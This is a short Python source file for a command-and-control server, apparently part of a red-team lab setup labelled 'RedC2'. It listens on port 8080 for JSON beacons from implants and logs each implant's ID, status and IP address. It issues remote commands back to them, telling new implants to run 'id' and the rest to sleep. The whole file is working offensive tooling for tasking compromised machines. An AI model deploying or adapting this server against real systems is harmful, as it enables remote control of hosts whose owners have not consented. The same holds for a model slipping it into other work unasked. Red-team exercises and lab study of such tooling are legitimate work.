#!/usr/bin/env python3
import http.server
import socketserver
import logging
import time
import threading
import json
import sys
import os

# Add root to path
sys.path.append(os.path.dirname(os.path.abspath(__file__)))
import config
import utils

# Setup Logging
logger = utils.setup_logging("RedC2", config.RED_LOG)

PORT = 8080
IMPLANTS = {}

class C2Handler(http.server.BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        # Silence default logs
        pass

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)

        try:
            data = json.loads(post_data.decode('utf-8'))
            implant_id = data.get('id')
            status = data.get('status')

            if implant_id:
                IMPLANTS[implant_id] = {
                    "last_seen": time.time(),
                    "status": status,
                    "ip": self.client_address[0]
                }
                logger.info(f"BEACON: {implant_id} [{status}]")

            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()

            # Send commands (if any)
            response = {"command": "sleep", "args": []}
            # Simple logic: if new, identify.
            if status == "INIT":
                response = {"command": "exec", "args": "id"}

            self.wfile.write(json.dumps(response).encode('utf-8'))

        except Exception as e:
            logger.error(f"Bad Beacon: {e}")
            self.send_response(500)
            self.end_headers()

def run_server():
    try:
        with socketserver.TCPServer(("", PORT), C2Handler) as httpd:
            logger.info(f"C2 Server listening on port {PORT}")
            httpd.serve_forever()
    except OSError as e:
        logger.error(f"C2 Bind Failed: {e}")
        sys.exit(1)

if __name__ == "__main__":
    run_server()
